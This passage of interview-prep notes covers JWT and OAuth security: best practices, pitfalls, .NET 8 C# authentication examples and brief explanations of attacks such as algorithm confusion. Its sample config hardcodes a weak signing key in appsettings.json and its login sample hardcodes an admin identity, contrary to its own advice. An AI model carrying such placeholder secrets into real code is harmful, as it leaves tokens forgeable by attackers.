- Introspection calls (opaque tokens) are the biggest latency cost of that model — mitigate with short-TTL caching.
- Clock skew tolerance should stay small (1–2 min) — too generous extends effective token validity; too strict causes spurious failures from clock drift.

## 5. Best Practices

**Q: What are the top JWT/OAuth security best practices to cite in an interview?**

A:
- Never put secrets/PII in a JWT — treat payload as public.
- Keep access tokens short-lived (minutes, not hours).
- Always validate `iss`/`aud`/`exp`/`nbf` — skipping `aud` enables cross-service token replay.
- Use asymmetric signing (RS256/ES256) when multiple services validate tokens.
- Use a dedicated token-type claim (`token_use`) so refresh tokens can't be replayed as access tokens.
- Prefer scopes over embedding frequently-changing roles directly in tokens.
- Rotate signing keys via `kid` + JWKS; keep old keys until their tokens expire.
- Handle clock skew (1–2 minutes).
- Always use HTTPS; never send tokens in a query string.
- Rotate refresh tokens on every use and detect reuse.
- Revoke on logout and credential/password change, not just explicit revoke.
- Rate-limit the refresh/token endpoint.
- Prefer policy-based authorization over scattered role checks.
- Store secrets in a managed secret store (Key Vault/Secrets Manager), never in committed `appsettings.json`.

## 6. Common Pitfalls

### 6.1 JWT Pitfalls

**Q: List the top JWT pitfalls and their fixes.**

A:
- Long expiry → stolen tokens stay valid long; use 5–30 min + refresh tokens.
- No revocation strategy → logout doesn't invalidate; use blacklist/refresh revocation/short lifetime.
- Insecure storage (`localStorage`) → XSS steals it; use HttpOnly cookies or BFF.
- Large payloads → network overhead; keep claims minimal.
- Skipping `iss`/`aud`/`exp`/`nbf` validation → accepts forged/misdirected tokens.
- Weak signing keys → forgeable tokens; use strong/rotated RSA/ECDSA keys.
- Clock skew misconfiguration → random auth failures; use 1–2 min tolerance.
- JWT in query string → leaks via logs/history; use the header.
- No HTTPS enforcement → interceptable/replayable.
- Assuming JWT is encrypted → it's readable; never embed secrets.

### 6.2 OAuth Pitfalls

**Q: List the top OAuth pitfalls and their fixes.**

A:
- Implicit flow for SPAs → token leakage; use Authorization Code + PKCE.
- Wildcard/loose redirect URI validation → hijacking; use strict allow-listing.
- Client secrets in frontend code → impersonation; never embed, use PKCE for public clients.
- Over-permissioned scopes → excessive blast radius; least privilege.
- Missing token validation in the API → blind trust; always validate issuer/audience/expiry/signature.
- No refresh token rotation → replay; rotate on every use.
- Poor revocation strategy → stolen refresh tokens live indefinitely.
- Confusing OAuth with authentication → use OIDC for authentication, OAuth for delegated authorization.

### 6.3 Refresh Token Pitfalls

**Q: List the top refresh token pitfalls and their fixes.**

A:
- Insecure storage → XSS account takeover; use HttpOnly cookies/encrypt at rest.
- No rotation → indefinite access-token minting if stolen; rotate every refresh.
- Long expiry (months) → wide attack window; use 7–30 days + periodic re-login.
- Not bound to user/device → replay from another device; bind to device/session fingerprint.
- No revocation on logout/password change → explicitly revoke on both.
- Unlimited active tokens per user → session sprawl; cap sessions, maintain inventory.
- No replay detection → silent ongoing compromise; detect reuse, revoke the whole family.
- Refresh endpoint not rate-limited → brute-force exposure; rate limit and monitor.
- Sent via query string → leaks via logs; use body or secure cookie only.
- No audit logging → attacks go unnoticed; log and monitor.

## 7. Implementation Reference (C#)

**Q: What does a minimal JWT bearer setup in .NET 8 look like?**

A: Configure `TokenValidationParameters` with `ValidateIssuer`, `ValidateAudience`, `ValidateLifetime`, `ValidateIssuerSigningKey` all `true`, explicit `ValidIssuer`/`ValidAudience`/`IssuerSigningKey`, and a deliberate `ClockSkew` (e.g. `TimeSpan.FromMinutes(2)`, not `Zero`). Wire up with `AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(...)`, then `app.UseAuthentication(); app.UseAuthorization();`.

```json
{
  "Jwt": {
    "Key": "SUPER_SECRET_KEY_12345",
    "Issuer": "MyCompany.Auth",
    "Audience": "MyCompany.Api",
    "ExpiryMinutes": 30
  }
}
```

```csharp
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.IdentityModel.Tokens;
using System.Text;

var builder = WebApplication.CreateBuilder(args);

var jwtSettings = builder.Configuration.GetSection("Jwt");
var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = jwtSettings["Issuer"],
            ValidAudience = jwtSettings["Audience"],
            IssuerSigningKey = new SymmetricSecurityKey(key),
            ClockSkew = TimeSpan.FromMinutes(2) // small, deliberate skew — not TimeSpan.Zero in most real systems
        };
    });

builder.Services.AddAuthorization();
builder.Services.AddControllers();

var app = builder.Build();

app.UseAuthentication();
app.UseAuthorization();

app.MapControllers();
app.Run();
```

**Q: How do you generate a token in a token service?**

A: Build a `List<Claim>` (`sub`, email, role, a dedicated `token_use: "access"` claim), create `SigningCredentials` from a `SymmetricSecurityKey`, construct a `JwtSecurityToken` with issuer/audience/claims/expiry, and serialize with `JwtSecurityTokenHandler().WriteToken(token)`.

```csharp
public class JwtTokenService
{
    private readonly IConfiguration _config;

    public JwtTokenService(IConfiguration config) => _config = config;

    public string GenerateToken(string userId, string email, string role)
    {
        var jwtSettings = _config.GetSection("Jwt");
        var key = Encoding.UTF8.GetBytes(jwtSettings["Key"]!);

        var claims = new List<Claim>
        {
            new(JwtRegisteredClaimNames.Sub, userId),
            new(ClaimTypes.Email, email),
            new(ClaimTypes.Role, role),
            new("token_use", "access") // dedicated type claim — prevents refresh/access confusion
        };

        var credentials = new SigningCredentials(
            new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256);

        var token = new JwtSecurityToken(
            issuer: jwtSettings["Issuer"],
            audience: jwtSettings["Audience"],
            claims: claims,
            expires: DateTime.UtcNow.AddMinutes(int.Parse(jwtSettings["ExpiryMinutes"]!)),
            signingCredentials: credentials);

        return new JwtSecurityTokenHandler().WriteToken(token);
    }
}
```

**Q: How do you support both browser (cookie) and Postman/mobile (header) clients from one login endpoint?**

A: On login, set an HttpOnly/Secure/SameSite cookie (`access_token`) **and** return the token in the JSON body. In `JwtBearerEvents.OnMessageReceived`, check the `Authorization` header first (Postman/mobile), then fall back to the cookie (browser) — controllers need no special handling either way (`[Authorize]` just works).

```csharp
[HttpPost("login")]
public IActionResult Login(LoginRequest request)
{
    if (!IsValidUser(request)) return Unauthorized();

    var token = _tokenService.GenerateToken("1", "admin@test.com", "Admin");

    // Browser support
    Response.Cookies.Append("access_token", token, new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Strict,
        Expires = DateTime.UtcNow.AddMinutes(30)
    });

    // Postman/mobile support
    return Ok(new { access_token = token });
}
```

```csharp
.AddJwtBearer(options =>
{
    options.Events = new JwtBearerEvents
    {
        OnMessageReceived = context =>
        {
            // Priority 1: Authorization header (Postman/mobile)
            var authHeader = context.Request.Headers["Authorization"].FirstOrDefault();
            if (!string.IsNullOrEmpty(authHeader) && authHeader.StartsWith("Bearer "))
            {
                context.Token = authHeader["Bearer ".Length..];
            }
            // Priority 2: cookie (browser)
            else if (context.Request.Cookies.TryGetValue("access_token", out var cookieToken))
            {
                context.Token = cookieToken;
            }
            return Task.CompletedTask;
        }
    };
});
```

Controllers need no special handling either way:
```csharp
[Authorize]
[HttpGet("orders")]
public IActionResult GetOrders() => Ok("Secure Data");
```

**Q: What does a refresh endpoint with rotation + reuse detection look like conceptually?**

A: Look up the stored refresh token; if missing/expired/already consumed, reject — and if it was already consumed, revoke the entire token family (possible theft). Otherwise issue a new access token + new refresh token, and mark the old refresh token consumed while linking to the new one.

```csharp
var savedToken = _refreshTokenStore.Get(request.RefreshToken);
if (savedToken is null || savedToken.IsExpired || savedToken.IsConsumed) {
    if (savedToken?.IsConsumed == true) _refreshTokenStore.RevokeFamily(savedToken.FamilyId);
    return Unauthorized();
}
```

**Q: What belongs on a production settings checklist for JWT auth (per source notes)?**

A: HTTPS always enforced; CORS configured to allow credentials for the cookie flow; `SameSite=Strict/Lax` same-domain or `None; Secure` cross-domain; CSRF protection whenever cookies are used; access token expiry 10–30 minutes with a refresh token for seamless re-auth.

**Q: What does policy-based authorization registration look like?**

A: Register the policy once centrally, then reference it declaratively on controllers/endpoints.

```csharp
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("ITOnly", policy => policy.RequireClaim("Department", "IT"));
});

[Authorize(Policy = "ITOnly")]
public IActionResult InternalData() => Ok();
```

## 8. Sample Interview Q&A

**Q: How does JWT validation work internally? (interview-ready synthesis)**

A: Extract token from header/cookie → select key by `kid` from trusted JWKS → verify signature with a server-configured algorithm (never the token's own `alg`) → validate `exp`/`nbf`/`iss`/`aud` with small clock skew → materialize claims into `HttpContext.User` → authorization stage evaluates roles/policies → reject on any failure.

**Q: Authentication vs Authorization, in one line each with failure codes?**

A: Authentication = "who are you" → 401 on failure. Authorization = "what can you do" → 403 on failure.

**Q: Why is Basic Auth insecure, in one line?**

A: Credentials travel every request, Base64 ≠ encryption, no expiry/revocation, replayable if captured — mandate HTTPS, use only for legacy compatibility.

**Q: How do you revoke JWTs, in one line?**

A: No native revocation (stateless) — add state via short expiry, `jti` blacklist, token versioning, refresh-token revocation, or signing-key rotation; each trades away some statelessness.

**Q: JWT vs OAuth, in one line?**

A: JWT is a token format; OAuth 2.0 is an authorization framework for obtaining/using tokens. OAuth commonly uses JWT as its token format but they're not interchangeable concepts.

**Q: When should you use Windows Authentication?**

A: Internal enterprise apps within an AD domain needing SSO; unsuitable for public/internet-facing APIs (ties you to Kerberos/NTLM, no external client support).

**Q: How do you secure microservices communication?**

A: JWT between services (service-specific `aud`), mTLS for transport-level identity, API-gateway-level validation, network isolation — typically mTLS + JWT combined, not either/or.

**Q: Claims vs Roles — which is better?**

A: Claims give fine-grained, scalable control; roles are coarse and multiply combinatorially. Production default: policy-based authorization built from claims (and roles where useful), centralizing decision logic.

**Q: How do you handle token expiration on the frontend?**

A: Short-lived access tokens + refresh-token flow + silent refresh via an interceptor, so the user isn't interrupted by re-login.

**Q: How do you prevent token replay attacks?**

A: HTTPS everywhere, short token lifetime, secret/key rotation, device binding where feasible, and nonce/idempotency-key tracking for critical state-changing operations regardless of token validity.

**Q: Why is PKCE recommended even for confidential clients?**

A: It defends against authorization-code interception at the redirect step regardless of client type, and "always use PKCE" is simpler/safer guidance than a conditional rule, at no real operational cost.

**Q: Walk through an algorithm confusion attack, briefly.**

A: Server verifies RS256 with a public key but its library also accepts HS256 via the same key path; attacker crafts an HS256 token using the public RSA key bytes as the HMAC secret, producing a signature the server wrongly accepts. Fix: pin the algorithm server-side, never trust the token's `alg`, never share key material across symmetric/asymmetric paths.

**Q: What's the BFF pattern, briefly?**

A: SPA holds only a session cookie with its own backend, which does the OAuth dance server-side and never exposes a token to the browser — removes the "where to store a token in JS" problem at the cost of an extra backend component.

**Q: How would you design refresh token reuse detection, briefly?**

A: Mark tokens "consumed" not deleted after use; presenting a consumed token signals theft — revoke the entire token family and force re-authentication, even though it also logs out the legitimate user.
